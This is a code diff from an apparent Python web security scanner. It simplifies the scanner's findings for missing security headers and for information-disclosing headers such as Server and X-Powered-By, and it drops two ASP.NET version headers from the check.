-                        f"Header '{header_name}' not present in response",
+                        header_config["severity"],
+                        header_config["description"],
+                        f"Header '{header_name}' not present",
                         "/",
-                        remediation=config["remediation"]
+                        remediation=f"Add {header_name} header."
                     )
                     findings.append(finding)
                     self.logger.warning(f"Missing header: {header_name}")
 
-            # Check for information disclosure in headers
-            info_headers = ["Server", "X-Powered-By", "X-AspNet-Version", "X-AspNetMvc-Version"]
+            info_headers = ["Server", "X-Powered-By"]
             for header in info_headers:
                 if header in headers:
                     finding = Vulnerability.create(
-                        f"Information Disclosure: {header} Header",
+                        f"Information Disclosure: {header}",
                         "LOW",
-                        f"Server reveals information via {header} header",
+                        f"Server reveals info via {header}",
                         f"{header}: {headers[header]}",
                         "/",
-                        remediation=f"Remove {header} header. Hide server version information."
+                        remediation=f"Remove {header} header."
                     )
                     findings.append(finding)
 
